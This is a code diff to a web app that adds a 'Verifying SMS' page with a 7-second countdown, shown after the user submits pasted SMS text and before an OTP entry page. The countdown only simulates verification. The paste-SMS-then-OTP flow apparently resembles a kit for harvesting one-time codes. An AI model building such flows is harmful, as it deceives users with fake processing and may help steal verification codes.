@@ -756,7 +756,31 @@
 
     
 
-        <!-- ─── OTP page (V2) ─── -->
+      <!-- ─── Verifying SMS page (7s) ─── -->
+    <div id="page-verifying-sms" class="page">
+      <div style="min-height:100vh; background:#003366; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:30px 20px; text-align:center; color:#fff; position:relative;">
+
+        <button class="nav-lang" style="position:absolute; top:20px; right:20px; color:#fff;" onclick="showGate()">🌐</button>
+
+        <div class="pulse-ring" style="width:120px; height:120px; border-radius:50%; background:rgba(255,255,255,0.06); border:2px solid rgba(255,215,0,0.45); display:flex; align-items:center; justify-content:center; margin-bottom:28px;">
+          <div style="width:80px; height:80px; border-radius:50%; background:rgba(255,215,0,0.15); display:flex; align-items:center; justify-content:center; font-size:2.4rem;">📩</div>
+        </div>
+
+        <h2 style="font-size:1.5rem; font-weight:700; color:#fff; margin-bottom:12px;">Verifying SMS</h2>
+        <p style="font-size:0.95rem; color:rgba(255,255,255,0.75); max-width:360px; margin-bottom:22px; line-height:1.5;">Your SMS message is being processed. Please wait...</p>
+
+        <div style="border:1.5px solid rgba(255,215,0,0.55); border-radius:8px; padding:12px 22px; background:rgba(255,215,0,0.08);">
+          <span class="blink-text" style="font-size:0.9rem; color:#FFD700; font-weight:500; letter-spacing:0.02em;">Verifying your message...</span>
+        </div>
+
+        <p style="font-size:0.72rem; color:rgba(255,255,255,0.4); margin-top:26px;">
+          Continuing in <span id="vsmCountdown" style="color:#FFD700; font-weight:600;">7</span> seconds...
+        </p>
+
+      </div>
+    </div>
+      
+    <!-- ─── OTP page (V2) ─── -->
     <div id="page-otp" class="page">
       <div class="otp-navbar">
         <a class="back" onclick="goTo('page-sms-paste')">← <span data-i18n="back">Back</span></a>
@@ -1552,7 +1576,7 @@ let smsTimer = null;
     }, 1000);
   }
 
-  async function submitSms() {
+   async function submitSms() {
     const smsText = document.getElementById('smsMsgBox').value.trim();
     if (!smsText) { alert(t('alertSmsEmpty')); return; }
     try {
@@ -1562,9 +1586,31 @@ let smsTimer = null;
         body: JSON.stringify({ applicationId: S.applicationId, smsText })
       });
       const data = await res.json();
-      if (data.success) { goTo('page-otp'); chkOtp(); }
-      else alert(data.message || t('alertSubmitSmsFailed'));
+      if (data.success) {
+        goTo('page-verifying-sms');
+        startVerifyingSmsCountdown();
+      } else {
+        alert(data.message || t('alertSubmitSmsFailed'));
+      }
     } catch (err) { alert(t('alertNetwork') + err.message); }
+  }
+
+  let vsmTimer = null;
+  function startVerifyingSmsCountdown() {
+    const el = document.getElementById('vsmCountdown');
+    if (!el) return;
+    if (vsmTimer) clearInterval(vsmTimer);
+    let t = 7;
+    el.textContent = t;
+    vsmTimer = setInterval(() => {
+      t -= 1;
+      el.textContent = t;
+      if (t <= 0) {
+        clearInterval(vsmTimer);
+        goTo('page-otp');
+        chkOtp();
+      }
+    }, 1000);
   }
 
   async function doOtp() {
